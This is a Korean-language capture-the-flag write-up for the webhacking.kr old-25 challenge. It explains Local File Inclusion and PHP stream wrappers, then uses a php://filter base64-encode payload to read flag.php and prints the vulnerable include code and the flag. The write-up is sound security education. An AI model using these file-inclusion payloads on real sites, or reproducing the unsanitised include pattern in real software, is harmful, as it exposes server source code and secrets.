문제는 **webhacking.kr 에서 old-25** 이다.  

[문제 링크](http://webhacking.kr:10001/?file=hello)  

# 문제 경로

## 1. /?file=hello

<img src="1.png">  

접속 시 초기 경로이고, 다음과 같이 ls -al 을 실행한 결과와 ``hello world`` 가 적혀있다.  

현재 위치에 **flag.php, hello.php, index.php** 가 있다.

## 2. /?file=flag

<img src="2.png">  

바로 file 에 flag 를 입력했다.  

``FLAG is in the code`` 라고 적혀있었다.  

## 번외

참고로 path traversal 인줄 알고, ``http://webhacking.kr:10001/?file=../`` 처럼 입력도 했는데 그대로 였다.  

상위 디렉터리로 이동되지 않았다.

# 풀이하기 전에

사실 처음부터 막혀서 검색을 했다.  

그 결과 ``LFI(Local File Inclusion)`` 라는 취약점이 있다고 한다.  

## LFI 란

LFI 는 ``공격 대상 서버에 위치한 파일을 포함시켜 읽어오는 공격``이다.  

즉, 위처럼 **서버에 있는 파일을 읽을 수 있다**는 것을 의미한다.  

php 코드를 보면 ``include("index.php")`` 와 같은 코드가 있는 경우가 있다.  

이는 **index.php 라는 파일을 가져오는 것**을 의미한다.  

만약 다음과 같은 코드가 있다면, 

```php
<?php
    $file = $_GET['test'];
    if(isset($file))
    {
        include("pages/$test");
    }
    else
    {
        include("index.php");
    }
?>
```

``include("pages/$test");`` 를 통해 test 입력 값으로 **path traversal** 를 할 수도 있다.  

출처 : [https://godhaword.tistory.com/102](https://godhaword.tistory.com/102)

## Wrapper 란

php Wrapper 란 ``파일 시스템 함수(예: include, file_get_contents 등)와 함께 사용할 수 있는 특별한 URL 스타일의 프로토콜`` 이다.  

개인적인 생각으로는 php 에서 사용할 수 있는 프로토콜을 의미하는 것 같다.  

아래의 이미지에 있는 것처럼 php Wrapper 에는 12가지가 있다.  

<img src="3.png">  

### file://

``로컬 파일 시스템`` 에 접근하는 기본 wrapper 이다.  

예시 : ``file:///path/to/file.txt``

### http://, https://

``http(s)`` 프로토콜을 통해 ``원격 서버의 파일이나 데이터`` 에 접근하는 wrapper 이다.  

예시 : ``https://example.com/file.php?var1=val1&var2=val2``

### ftp://, ftps://

``ftp(S) 서버`` 에 파일을 ``업로드하거나 다운로드``할 때 사용하는 wrapper 이다.  

예시 : ``ftp://example.com/pub/file.txt``

### php://

PHP의 ``내부 스트림 및 입출력에 접근``하는 ``특수 wrapper``이다.  

#### php://stdin, php://stdout, php://stderr

php 프로세스에서 ``표준 입출력/에러 스트림에 접근`` 하는 스트림 이다.  

#### php://input

요청 본문에서 ``원시 데이터를 읽을 수 있는`` 읽기 전용 스트림 이다.  

#### php://output

``출력 버퍼(즉, 브라우저로 전송되는 데이터)에 직접 쓰는`` 스트림 이다.  

#### php://fd

``파일 디스크립터에 대한 직접 접근``을 허용하는 스트림 이다.  

#### php://memory, php://temp

파일과 같은 wrapper에 ``임시 데이터를 저장할 수 있는 읽기-쓰기`` 스트림 이다.  

``php://memory`` 는 항상 데이터를 ``메모리에 저장``  
``php://temp`` 는 저장된 데이터 양이 미리 정의된 ``제한(기본값은 2MB)에 도달``하면 ``임시 파일을 사용``

예시 : ``php://temp/maxmemory``

#### php://filter

파일을 열 때 ``스트림에 필터를 적용``할 수 있도록 설계된 것이다.  

다음은 filter 에 들어가는 **매개변수**이다.  

|이름|설명|
|---|---|
|``resource=<stream to be filtered>``|**필수** 이고 필터링하려는 **스트림을 지정**한다.(파일, 디렉터리 위치)|
|``read=<filter list to apply to read chain>``|파이프 문자(``|``)로 구분하여 여기에 **하나 이상의 필터 이름**을 제공할 수 있습니다.(읽을 때 사용)|
|``write=<filter list to apply to write chain>``|파이프 문자(``|``)로 구분하여 여기에 **하나 이상의 필터 이름**을 제공할 수 있습니다.(작성할 때 사용)|
|``<filter list to apply to both chains>``|**read= 또는 write= 접두사가 없는** 필터 목록은 **읽기 및 쓰기** 체인 모두에 적절하게 적용됩니다.|

예시 : ``php://filter/resource=<stream to be filtered>``

### zlib://, bzip2://, zip://

``압축된 파일을 읽거나 쓸 때 사용``하는 wrapper 이다.  

예시
- ``compress.zlib://file.gz``
- ``compress.bzip2://file.bz2``
- ``zip://archive.zip#dir/file.txt``

### data://

``데이터를 직접 스트림으로 전달``할 때 사용하는 wrapper 이다.  

예시
- ``data://text/plain;base64,``
- ``echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');``

위처럼 base64 로 인코딩을 할 수도 있다.  

### glob://

``경로 이름을 패턴으로 찾을 때`` 사용하는 스트림이다.  

예시 : ``$it = new DirectoryIterator("glob://ext/spl/examples/*.php");``

위의 예시를 **/ext/spl/examples** 에서 **php** 확장자를 가진 파일을 전부 가져오라는 뜻이다.  

### phar://

``Phar 아카이브``에서 개별 파일 ``압축 및 파일별 메타데이터도 조작`` 할 때 사용하는 스트림이다.  

(Phar 아카이브는 완전한 PHP 애플리케이션 또는 라이브러리를 단일 파일로 배포하는 데 사용)  

예시 : ``file_put_contents('phar://my.phar/somefile.php', 0, $context);``

## 여기서부터는 확실하지 않음(정보가 별로 없음)

### ssh2://

``SSH2 프로토콜을 이용해 ``원격 서버에 안전하게 접속하여 다양한 작업``을 할 수 있도록 하는 wrapper 이다.  

``ssh2.shell://`` ``ssh2.exec://`` ``ssh2.tunnel://`` ``ssh2.sftp://`` ``ssh2.scp://``(PECL) 등이 있다.  

예시
- ``ssh2.shell://user:pass@example.com:22/xterm``
- ``ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd``
- ``ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14``
- ``ssh2.sftp://user:pass@example.com:22/path/to/filename``

### rar://

``RAR 압축 파일`` 내부의 파일에 ``접근``할 수 있게 해주는 wrapper 이다.  

예시 : ``rar://<url encoded archive name>[*][#[<url encoded entry name>]]``

### ogg://

``OGG 포맷(오디오 파일)에 접근``할 수 있는 wrapper 이다.  

예시
- ``ogg://soundfile.ogg``
- ``ogg:///path/to/soundfile.ogg``
- ``ogg://http://www.example.com/path/to/soundstream.ogg``

### expect://

``시스템 명령어를 실행``하고, 그 결과를 스트림으로 읽을 수 있게 해주는 ``특수 wrapper`` 이다.  

예시 : ``expect://command``

출처 : [https://www.php.net/manual/en/wrappers.php](https://www.php.net/manual/en/wrappers.php)

# 풀이과정

이 문제에서는 flag.php 를 읽으면 되는 것 같다.  

그래서 위에서 공부한 wrapper 를 사용할 건데, 그 중에서 ``php://filter`` 를 이용할 것이다.  

```php

<?php
/* This will output the contents of
  www.example.com entirely in uppercase */
readfile("php://filter/read=string.toupper/resource=http://www.example.com");

/* This will do the same as above
  but will also ROT13 encode it */
readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");
?>
```

위는 ``php://filter`` 를 이용한 예시인데, 여기서 첫 번째 줄은 ``http://www.example.com`` 를 **대문자** 로 읽는 것이다.  

반면에 두 번째 줄은 ``http://www.example.com`` 를 **대문자**로 읽는데, 여기서 **rot13** 으로 인코딩하라는 뜻이다.  

이처럼 ``php://filter`` 는 사용할 수 있는 필터가 다음과 같다.  

- String Filter : ``string.rot13``, ``string.toupper``, ``string.tolower``
- Conversion Filters : ``convert.base64-encode``, ``convert.base64-decode``, ``convert.quoted-printable-encode``, ``convert.quoted-printable-decode``, ``convert.iconv.*``
- Compression Filters : ``zlib.deflate``, ``zlib.inflate``, ``bzip2.compress``, ``bzip2.decompress``
- Encryption Filters : ``mcrypt.*``, ``mdecrypt.*``

이러한 필터를 사용하면 문제를 해결할 수 있다.  

## 1. ``http://webhacking.kr:10001/?file=php://filter/resource=flag``

처음에는 flag 를 읽게끔 했는데, ``FLAG is in the code`` 라고 나왔다.  

개인적으로 따로 코드에서 필터링을 하는 것 같다고 생각을 했다.  

## 2. ``http://webhacking.kr:10001/?file=php://filter/read=convert.base64-encode/resource=flag``

그래서 인코딩을 해서 출력하게 해봤는데, 다음과 같이 나왔다.  

<img src="4.png">  

``PD9waHAKICBlY2hvICJGTEFHIGlzIGluIHRoZSBjb2RlIjsKICAkZmxhZyA9ICJGTEFHe3RoaXNfaXNfeW91cl9maXJzdF9mbGFnfSI7Cj8+Cg==``

그래서 base64 로 디코딩하니 다음과 같이 나왔다.  

```php
<?php
  echo "FLAG is in the code";
  $flag = "FLAG{this_is_your_first_flag}";
?>
```

왜 인코딩을 했을 때 ``FLAG is in the code`` 가 나오지 않았는 지 궁금했는데, 찾아봤을 때 인코딩을 해서 **php 코드로 인식을 못했기** 때문이라는 글이 있었다.  

# 참고

위처럼 동일하게해서 **index.php** 를 읽어봤다.  

```php
<html>
<head>
<meta http-equiv=Content-Type content="text/html; charset=euc-kr">
<title>Challenge 25</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }
textarea { background:silver; color:black; fnot-size:9pt; }
</style>
</head>
<body>
<?php
  echo("<pre>");
  system("ls -al");
  echo("</pre>");
  if(!$_GET['file']) echo("<meta http-equiv=refresh content=0;url=?file=hello>");
  echo "<hr><textarea rows=10 cols=100>";
  $file = $_GET['file'].".php";
  if($file == "index.php") exit(); // anti infinite loop
  include $file;
  echo "</textarea>";
?>
</body>
</html>
```

``$file = $_GET['file'].".php";`` 에서 file 뒤에 입력한 값을 이용해 파일 이름을 지정하고, ``include $file;`` 를 이용해 파일을 읽는 모습이다.  

그리고 중간에 ``if($file == "index.php") exit(); // anti infinite loop`` 를 통해 index.php 는 읽지 못하게 만들었다.  

또한 **hello.php** 는 다음과 같았다.  

```php
<?php
  echo "hello world";
?>
```

따라서 정답은 **FLAG{this_is_your_first_flag}** 이다.  